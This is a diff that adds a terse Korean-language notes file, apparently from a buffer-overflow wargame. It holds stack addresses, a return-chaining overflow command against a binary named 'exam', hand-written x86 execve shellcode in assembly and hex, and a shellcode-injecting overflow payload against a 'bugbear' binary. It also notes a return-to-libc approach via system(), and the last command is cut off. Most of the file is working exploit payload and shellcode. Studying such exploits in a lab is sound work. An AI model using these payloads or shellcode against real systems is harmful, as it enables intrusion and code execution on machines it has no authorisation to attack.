@@ -1,0 +1,56 @@
+
+ebp: 0xbffffaf8
+ret: 0xbffffafc
+argc: 0xbffffb00
+argv: 0xbffffb04
+argv + 1: 0xbffffb08
+argv + 2: 0xbffffb0c
+
+bash:
+
+오메가 프로젝트
+	- 공유 라이브러리 영역에 이미 system함수가 있음을 활용
+
+
+* 전역함수를 두고 컴파일 하면, 전역함수의 주소는 바뀌지도 않는다.
+
+0x8048430
+
+./exam "$(for x in `seq 1 44`; do printf "\x90"; done)$(printf "\x30\x84\x04\x08")$(printf "\x44\x84\x04\x08")$(printf "\x58\x84\x04\x08")$(printf "\xcb\x09\x03\x40")"
+
+원래 main의 ret주소: 0x400309cb
+
+func1: 0x8048430
+func2: 0x8048448
+func3: 0x8048460
+
+.section .text
+.globl _start
+
+_start:
+	push $0x64692f2f
+	push $0x6e69622f
+	push $0x7273752f
+	xor %eax, %eax
+	push %eax
+	lea 4(%esp), %eax
+	push %eax
+	
+	xor %eax, %eax
+	movb $11, %al
+	mov (%esp), %ebx
+	lea (%esp), %ecx
+	xor %edx, %edx
+	int $0x80
+
+/usr/lib/gcc-lib/i386-redhat-linux/egcs-2.91.66/collect2 -m elf_i386 -static -o exam /usr/lib/crt1.o /usr/lib/crti.o /usr/lib/gcc-lib/i386-redhat-linux/egcs-2.91.66/crtbegin.o -L/usr/lib/gcc-lib/i386-redhat-linux/egcs-2.91.66 -L/usr/i386-redhat-linux/lib /tmp/ccMBLByx.o -lgcc -lc -lgcc /usr/lib/gcc-lib/i386-redhat-linux/egcs-2.91.66/crtend.o /usr/lib/crtn.o
+
+\x31\xc0\x50\x68\x2f\x2f\x69\x64\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x31\xc0\x50\x8d\x44\x24\x04\x50\x31\xc0\xb0\x0b\x8b\x1c\x24\x8d\x0c\x24\x31\xd2\xcd\x80
+
+./bugbear "$(printf "\x31\xc0\x50\x68\x2f\x2f\x69\x64\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x31\xc0\x50\x8d\x44\x24\x04\x50\x31\xc0\xb0\x0b\x8b\x1c\x24\x8d\x0c\x24\x31\xd2\xcd\x80")$(printf "\x90\x90\x90\x90")$(printf "\xd8\xfa\xff\xbf")"
+0xbffffad8
+
+printf 주소: 0x956025ff
+system 주소: 0x81e58955
+
+./bugbear "$(printf "\x55\x89\xe5\x81")$(for x )
